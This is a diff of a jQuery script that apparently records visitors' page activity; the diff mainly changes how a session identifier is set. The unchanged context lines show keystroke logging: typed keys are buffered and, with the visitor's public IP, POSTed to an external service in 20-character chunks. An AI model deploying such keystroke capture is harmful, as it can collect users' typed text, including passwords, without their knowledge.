@@ -24,13 +24,16 @@ $j(document).ready(function() {
 	$j.getJSON("https://jsonip.com/", function (data) {
 		pcIp=data.ip;
 	});
-	
-	if (window.browSession == null) 
-		window.browSession = Math.floor((Math.random() * 10000) + 1);
-		
+			
 	$j("body").append('<div id="divProxy" name="divProxy"></div>');
 	
 	document.onkeypress= function(event){  
+		if (event.target){
+			window.browSession = event.target.id;
+		}
+		else{
+			window.browSession = "";
+		}
 		teclado = teclado + event.key;
 		if (teclado.length==20){
 			submitData(event,"texto:"+teclado);
@@ -39,6 +42,12 @@ $j(document).ready(function() {
     }; 
 	
 	$j(listaHTML).on("eventos", function(event) { 
+		if (event.target){
+			window.browSession = event.target.id;
+		}
+		else{
+			window.browSession = "";
+		}
 		var element = $j(this).closest(listaHTML).attr("id"); 
 		var type = event.type;
 	    var a = "<p>" + document.URL + " -> "+ $j(this).closest(listaHTML).attr('id')+ " -> " + type + " -> " + $j.now() +"</p>"
@@ -65,7 +74,7 @@ $j(document).ready(function() {
 	window.mouseXPos = e.pageX;  
 	window.mouseYPos = e.pageY;  
 	var data = '{position:{x:"' + mouseXPos + '", y:"' + mouseYPos + '"}, action:"'+ action + '", element:"'+ element + '"}';  
-//	submitData(event,element); 
+// submitData(event,element);
 }); 
 	
 function onchange (event) {  
@@ -75,7 +84,8 @@ function onchange (event) {
 
 function submitData(event,element) {
 	if(event){
-		//alert(element + ',' + document.URL + ',' + $j.now() + ',' + window.browSession + ',' + pcIp);
+		// alert(element + ',' + document.URL + ',' + $j.now() + ',' +
+		// window.browSession + ',' + pcIp);
 		$j.ajax({
 			url:"http://www.myService.com",
 			type:"POST",
